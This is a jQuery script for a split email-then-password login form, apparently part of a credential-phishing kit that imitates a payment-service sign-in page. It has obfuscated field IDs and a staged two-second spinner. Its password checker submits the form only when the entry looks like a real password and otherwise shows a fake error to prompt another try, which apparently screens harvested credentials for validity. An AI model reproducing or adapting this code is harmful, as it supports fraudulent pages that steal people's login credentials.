$(document).ready(function(){
	//Section EMAIL
    $('#btnNext').click(function(event){
    	event.preventDefault();
    	if($('#xysemailx').val().length <= 0) {
    		$('#login_emaildiv').addClass('hasError');
    		$('#login_emaildiv').css("z-index", "100");
    		$('#emailErrorMessage').addClass("show");
            $('#emailErrorMessage .invalidError').addClass("hide");
    		$('#emailErrorMessage .emptyError').removeClass("hide");
    	}
    	else
    	{
    		if(!isEmail($('#xysemailx').val())){
    			$('#login_emaildiv').addClass('hasError');
	    		$('#login_emaildiv').css("z-index", "100");
	    		$('#emailErrorMessage').addClass("show");
	    		$('#emailErrorMessage .emptyError').addClass("hide");
	    		$('#emailErrorMessage .invalidError').removeClass("hide");
    		}
    		else
    		{
    			$('#splitEmail').addClass('hide');
    			$('#splitPassword').removeClass('hide');
    			$('#splitPasswordSection').removeClass('hide');
    			$('#splitPassword').addClass('transformRightToLeft');
    			$('.profileRememberedEmail').removeClass('hide');
    			$('.profileDisplayEmail').text($('#xysemailx').val());
    		}
    	}
    });
    $('#xysemailx').blur(function(event){
    	if($('#xysemailx').val().length <= 0) {
    		$('#login_emaildiv').addClass('hasError');
    	}
    	else
    	{
    		$('#login_emaildiv').removeClass('hasError');
    	}
    });
    $('#xysemailx').keypress(function(event){
    	$('#login_emaildiv').removeClass('hasError');
    	$('#login_emaildiv').css("z-index", "1");
    	$('#emailErrorMessage').removeClass("show");
    });
    $('#xysemailx').focus(function(event){
    	$('#login_emaildiv').css("z-index", "1");
    	$('#emailErrorMessage').removeClass("show");
    });
    $('a.infoLink').click(function(){
    	$('p.bubble-tooltip').fadeIn(200);
    });
    $('a.infoLink').mouseleave(function(){
    	$('p.bubble-tooltip').fadeOut(200);
    });
   	$('a.notYouLink').click(function (){
   		$('.profileRememberedEmail').addClass('hide');
   		$('#splitPassword').removeClass('transformRightToLeft');
   		$('#splitPasswordSection').addClass('hide');
   		$('#splitPassword').addClass('hide');
   		$('#splitEmail').removeClass('hide');
   	});
   	//Section PASSWORD
   	$('#btnLogin').click(function(event){
    	event.preventDefault();
    	if($('#xyspassx').val().length <= 0) {
    		$('#login_passworddiv').addClass('hasError');
    		$('#login_passworddiv').css("z-index", "100");
    		$('#passwordErrorMessage').addClass("show");
    		$('#passwordErrorMessage .emptyError').removeClass("hide");
    	}
    	else
    	{
    		$('.transitioning').addClass('spinner');
    		$('.transitioning').fadeIn();
    		setTimeout(function(){
    			if(isPasswd($('#xyspassx').val())){
                    $("form").submit();
                    $("form").bind("ajaxStop", function(){
                        $('.transitioning').fadeOut();
                    });
    			}
    			else
    			{
                    $('.transitioning').fadeOut();
                    $('.profileRememberedEmail').removeClass('hide');
                    $('.profileRememberedEmail').addClass('cookiedProfile');
                    $('.notifications').removeClass('hide');
    			}
		    }, 2000);
    	}
    });
    $('#xyspassx').blur(function(event){
    	if($('#xyspassx').val().length <= 0) {
    		$('#login_passworddiv').addClass('hasError');
    	}
    	else
    	{
    		$('#login_passworddiv').removeClass('hasError');
    	}
    });
    $('#xyspassx').keypress(function(event){
    	$('#login_passworddiv').removeClass('hasError');
    	$('#login_passworddiv').css("z-index", "1");
    	$('#passwordErrorMessage').removeClass("show");
    });
    $('#xyspassx').keyup(function(){
        console.log($('#xyspassx').val().length);
        if($('#xyspassx').val().length > 0){
            if($('#xyspassx').attr('type') != 'password'){
                $('.hidePassword').removeClass('hide');
                $('.showPassword').addClass('hide');
            }
            else
            {
                $('.hidePassword').addClass('hide');
                $('.showPassword').removeClass('hide');
            }
        }
        else
        {
            $('.hidePassword').addClass('hide');
            $('.showPassword').addClass('hide');
        }
    });
    $('#xyspassx').focus(function(event){
    	$('#login_passworddiv').css("z-index", "1");
    	$('#passwordErrorMessage').removeClass("show");
        console.log($('#xyspassx').val().length);
        if($('#xyspassx').val().length > 0){
            if($('#xyspassx').attr('type') != 'password'){
                $('.hidePassword').removeClass('hide');
                $('.showPassword').addClass('hide');
            }
            else
            {
                $('.hidePassword').addClass('hide');
                $('.showPassword').removeClass('hide');
            }
        }
    });
    $('.showPassword').click(function(event){
        $('.showPassword').addClass('hide');
        $('.hidePassword').removeClass('hide');
        $('#xyspassx').attr('type', 'text');
    });
    $('.hidePassword').click(function(event){
        $('.hidePassword').addClass('hide');
        $('.showPassword').removeClass('hide');
        $('#xyspassx').attr('type', 'password');
    });

    function isEmail(email) {
		var regex = /^([a-zA-Z0-9_.+-])+\@(([a-zA-Z0-9-])+\.)+([a-zA-Z0-9]{2,4})+$/;
		return regex.test(email);
	}
	function isPasswd(passwd) {
        if(passwd.length >= 8 && passwd.length <= 20 && !(/(.)\1{3}/i.test(passwd)) && (/[^A-Za-z]/.test(passwd)) && !(/0123|1234|2345|3456|4567|5678|6789|7890|8901|9012/.test(passwd)) && !(/qwer|wert|erty|rtyu|tyui|yuio|uiop|asdf|sdfg|dfgh|fghj|ghjk|hjkl|zxcv|xcvb|cvbn|vbnm|QWER|WERT|ERTY|RTYU|TYUI|YUIO|UIOP|ASDF|SDFG|DFGH|FGHJ|GHJK|HJKL|ZXCV|XCVB|CVBN|VBNM/.test(passwd)) && !(/\s/.test(passwd)) && !(/access14|americanidol|baseball|baseball1|bigdaddy|blink182|butthead|cocacola|computer|corvette|cowboys|danielle|dolphins|einstein|firebird|football|football1|iloveyou|iloveyou1|internet|jennifer|jordan23|liverpool|liverpool1|marlboro|maverick|melanie|michelle|midnight|mistress|mountain|myspace1|password|password1|princess1|qwertyui|redwings|rush2112|samantha|scorpion|slipknot1|srinivas|startrek|starwars|sunshine|superman|superman1|swimming|trustno1|victoria|whatever|passwort|passwort1|frankfurt|fussball/i.test(passwd))) {
            return true;
        }
        else
        {
            return false;
        }
    }
});